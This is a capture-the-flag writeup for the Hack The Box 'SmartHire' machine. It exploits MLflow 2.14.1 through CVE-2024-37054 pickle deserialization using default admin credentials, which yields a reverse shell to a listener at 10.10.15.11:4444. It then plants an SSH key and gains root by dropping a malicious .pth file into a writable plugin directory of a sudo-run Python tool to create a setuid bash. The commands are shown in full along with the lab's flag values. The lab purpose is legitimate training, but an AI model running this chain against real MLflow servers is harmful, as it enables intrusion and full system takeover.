# SmartHire Linux Medium HTB Machine Writeup

#cve-2024-37054
## NMAP Emuneration
```bash
┌──(jameskaois㉿kali)-[~]
└─$ nmap -sC -sV 10.129.245.215 -v
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-05 09:29 +0700
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 09:29
Completed NSE at 09:29, 0.00s elapsed
Initiating NSE at 09:29
Completed NSE at 09:29, 0.00s elapsed
Initiating NSE at 09:29
Completed NSE at 09:29, 0.00s elapsed
Initiating Ping Scan at 09:29
Scanning 10.129.245.215 [4 ports]
Completed Ping Scan at 09:29, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:29
Completed Parallel DNS resolution of 1 host. at 09:29, 0.50s elapsed
Initiating SYN Stealth Scan at 09:29
Scanning 10.129.245.215 [1000 ports]
Discovered open port 22/tcp on 10.129.245.215
Discovered open port 80/tcp on 10.129.245.215
Completed SYN Stealth Scan at 09:29, 4.39s elapsed (1000 total ports)
Initiating Service scan at 09:29
Scanning 2 services on 10.129.245.215
Completed Service scan at 09:29, 6.40s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.245.215.
Initiating NSE at 09:29
Completed NSE at 09:29, 5.25s elapsed
Initiating NSE at 09:29
Completed NSE at 09:29, 0.79s elapsed
Initiating NSE at 09:29
Completed NSE at 09:29, 0.00s elapsed
Nmap scan report for 10.129.245.215
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 41:3c:e3:bb:88:70:99:7f:b8:96:59:48:9b:85:98:69 (ECDSA)
|_  256 d5:9d:fd:6b:be:d8:39:6f:3f:43:ab:0e:f6:3e:22:db (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://smarthire.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 09:29
Completed NSE at 09:29, 0.00s elapsed
Initiating NSE at 09:29
Completed NSE at 09:29, 0.00s elapsed
Initiating NSE at 09:29
Completed NSE at 09:29, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.99 seconds
           Raw packets sent: 1021 (44.900KB) | Rcvd: 1020 (41.076KB)
```
## Web Emuneration
In `smarthire.htb`, there are 2 visible routes `smarthire.htb/login` and `smarthire.htb/register`, tried registering an account and get redirected to `smarthire.htb/dashboard`
Read the source in `/dashboard` saw 3 related routes:
- `/model_info` – GET, returns user model info.
- `/upload_hiring_data` – POST, uploads CSV training data.
- `/predict` – GET/POST, model prediction.

```bash
┌──(jameskaois㉿kali)-[~]
└─$ curl http://smarthire.htb/model_info -b "session=.eJyrVkrOzy1IzKtUslIyNDJW0lEqLU4tis9MAfEtk82MUi3M0iySjKASeYm5qUCZLCBVnJ2Yn1msVAsAoQ4U0A.aknCSQ.KYTZ0CLYP6zBF7i9gjxFM-jHtTQ"

{"model_info":null,"model_name":"123-19c62e86f8b2-model","status":"success"}
```
Based on this result, searching online the platforms is running may be 4 of these **Kubeflow, AWS SageMaker, Vertex AI, or MLflow**
Using `ffuf` and find `models.smarthire.htb`, using `admin:password` to login and found platform `MLFlow 2.14.1`
```bash
┌──(jameskaois㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.smarthire.htb -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://FUZZ.smarthire.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

models                  [Status: 401, Size: 137, Words: 11, Lines: 1, Duration: 187ms]
:: Progress: [4989/4989] :: Job [1/1] :: 3 req/sec :: Duration: [0:29:35] :: Errors: 4988 ::
```
## Get user flag
Searching online found: [CVE-2024-37054](https://github.com/tristanqtn/CVE-2024-37054/blob/main/README.md)
```bash
┌──(venv)─(jameskaois㉿kali)-[~/Documents/hackthebox/smarthire]
└─$ python3 exploit.py --mlflow http://models.smarthire.htb \
  --user admin --pass password \
  revshell 10.10.15.11 4444

┌─────────────────────────────────────────────────┐
│  CVE-2024-37054  //  MLflow pyfunc              │
│  Pickle deserialization in load_model()         │
│  Affects MLflow 0.9.0 – 2.14.1                  │
│  Written by: Drachh_                            │
└─────────────────────────────────────────────────┘

[*] Validating MLflow  →  http://models.smarthire.htb
[+] MLflow OK — credentials valid — 1 model(s) registered

[*] Trying app login with provided credentials…
[!] App login failed (HTTP 200) — falling back to registration
[*] Registering throwaway account…
    username=hpxpthks  password=zwfzdvpe  company=xdpywzap
[+] Registered.
[+] Session: eyJjb21wYW55Ijoi…

[*] Uploading CSV to trigger model training…
[+] Model trained: xdpywzap-eac65b6b1166-model

[*] Model: xdpywzap-eac65b6b1166-model
[*] experiment_id=0  run_id=6c958e30…

[*] Payload: reverse shell  →  10.10.15.11:4444
[!] Start your listener:  nc -lvnp 4444

[*] Poisoning artifact  →  http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/6c958e3094d7481a875ea8723c003b5e/artifacts/model/python_model.pkl                                   
[+] Uploaded (89 bytes)

[*] Press ENTER when your listener is ready…

[*] Triggering model load  →  http://smarthire.htb/predict
[!] Trigger error: HTTPConnectionPool(host='smarthire.htb', port=80): Read timed out. (read timeout=15)

[+] Done — check your listener!
```
Reverse shell:
```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/smarthire]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.11] from (UNKNOWN) [10.129.245.215] 58662
bash: cannot set terminal process group (1020): Inappropriate ioctl for device
bash: no job control in this shell
svcweb@smarthire:/var/www/smarthire.htb$ id
id
uid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),1002(devs)
svcweb@smarthire:/var/www/smarthire.htb$ mkdir -p /home/<usernam               
mkdir -p /
svcweb@smarthire:/var/www/smarthire.htb$ mkdir -p /home/svcweb/.ssh
mkdir -p /home/svcweb/.ssh
svcweb@smarthire:/var/www/smarthire.htb$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCcJSMDPE/FkZ96OgyR1UP++vDKbK3tgFQH/jygCimqMwXM7HjSqvis2rRU8Ql6doCzNVIm3I+J5qVCgEhbI3dYnu6XCNZkTvU+5wwGIlnhUZWcPAazGfBLOU+DyGMT8HyweFjgynkeGIcl3O0L3J/eVLEsdthXysZXrndJ67JSzkOwClFukTaR3543qwo0d3rLE0sPZj+cTZfmSA32hC2TCB2PMf+fuNZx9wSxx/gddJCGu0VQf4mjxCP8ART+KI7KHuSAZ8a9DIbNiThnGwR/5NeyjELEJJdW2wgbqyosJ7d7haglFDRDS9Q1dTpoAfpXx+vWBeQzF9TDmvved6QtEbARtZEYNGse4pdaohU/uOG/vUR2aCIpSpMuv959bXWnQd0WWT3gwxF6mNkU2FCwnRSZUPiAVk3ciolaRU+iNq61JEgE1MMJN+jyCAH6POxd25tjet4Bs4rBn6aONzPp5US/9BOe0UaOEP3M4H32p01JfMpq0dKmcCiEfxJ7WREN9c5CFaVQIDUT+lsBF3C2ta4PPrOn0ZDY+PjgsWQuTMG4VYDhkEv79rwRGwxzblHPgeIDzIFNRqY80mdqovBzxfa6tpgr4VmEwC9pTelBHPQ/rJg6aWa4WRu/HZqnaSULE3Drr6sH8ua5owuMNv8vxhnl4Ot1o2MhQ+UWT3QxdQ== jameskaois@kali" >> /home/svcweb/.ssh/authorized_keys
<meskaois@kali" >> /home/svcweb/.ssh/authorized_keys
svcweb@smarthire:/var/www/smarthire.htb$ chmod 700 /home/svcweb/.ssh 
chmod 700 /home/svcweb/.ssh 
svcweb@smarthire:/var/www/smarthire.htb$ chmod 600 /home/svcweb/.ssh/authorized_keys
<re.htb$ chmod 600 /home/svcweb/.ssh/authorized_keys
svcweb@smarthire:/var/www/smarthire.htb$ ^C
```
## Privilege Escalation
```bash
svcweb@smarthire:~$ id
uid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),1002(devs)
svcweb@smarthire:~$ sudo -l
Matching Defaults entries for svcweb on smarthire:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```
`svcweb` is part of `devs`, and also it can run `sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py`. However `svcweb` cannot write on `mlflowctf.py`:
```bash
svcweb@smarthire:~$ ls -la /opt/tools/mlflow_ctl/
total 16
drwxr-xr-x 3 root root 4096 Feb 19 18:16 .
drwxr-xr-x 3 root root 4096 Feb 19 15:50 ..
-rwxr-xr-- 1 root root 1080 Feb 19 18:16 mlflowctl.py
drwxr-xr-x 4 root root 4096 Feb 19 18:10 plugins
```
But `svcweb` can write to `/opt/tools/mlflow_ctl/plugins/devs`:
```bash
svcweb@smarthire:~$ ls -la /opt/tools/mlflow_ctl/plugins/
total 16
drwxr-xr-x 4 root root 4096 Feb 19 18:10 .
drwxr-xr-x 3 root root 4096 Feb 19 18:16 ..
drwxr-xr-x 3 root root 4096 Feb 20 09:26 core
drwxrwxr-x 2 root devs 4096 May 12 15:22 dev
svcweb@smarthire:~$ ls -la /opt/tools/mlflow_ctl/plugins/dev
total 8
drwxrwxr-x 2 root devs 4096 May 12 15:22 .
drwxr-xr-x 4 root root 4096 Feb 19 18:10 ..
```
## Get root flag
`mlflowctl.py`:
```python
#!/usr/bin/env python3
"""
MLFLOW-CTL: Operational interface for managing the MLflow service.
Supports a pluggable extension model for environment-specific logic.
For changes or plugin requests, please contact the Platform Team.
"""

from pathlib import Path
import sys
import site

BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

# make plugins importable
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))

def print_usage():
    print("Usage: mlflowctl.py [status|backup-models|restart]")
    sys.exit(1)

def main():
    import mlflow_actions, backup_models

    if len(sys.argv) < 2:
        print_usage()

    action = sys.argv[1]

    if action == "status":
        mlflow_actions.check_status()
    elif action == "backup-models":
        print("[*] Running backup via backup_models plugin...")
        backup_models.run()
    elif action == "restart":
        mlflow_actions.restart()
    else:
        print(f"[!] Unknown action: {action}")
        print_usage()

if __name__ == "__main__": main()
```
```bash
svcweb@smarthire:/opt/tools/mlflow_ctl$ echo "import os ; os.system('cp /bin/bash /tmp/root && chmod u+sx /tmp/root')" > /opt/tools/mlflow_ctl/plugins/dev/get_root.pth
svcweb@smarthire:/opt/tools/mlflow_ctl$ sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
[*] Checking MLflow service status...

[+] MLflow service status: active
[+] MLflow container status: 'Up About an hour'
svcweb@smarthire:/opt/tools/mlflow_ctl$ ls -la /tmp
# ...
-rwsr-xr-x  1 root   root   1396520 Jul  5 03:38 root
# ...
svcweb@smarthire:/opt/tools/mlflow_ctl$ /tmp/root -p
root-5.1# id
uid=1000(svcweb) gid=1000(svcweb) euid=0(root) groups=1000(svcweb),1001(mlflowweb),1002(devs)
root-5.1# cat /root/root.txt
0eb4cf43a37c15ee20c19b33bb5030c8
root-5.1# cat /home/svcweb/user.txt
d011a956dbee14938e35d32db4a5c079
root-5.1# 
```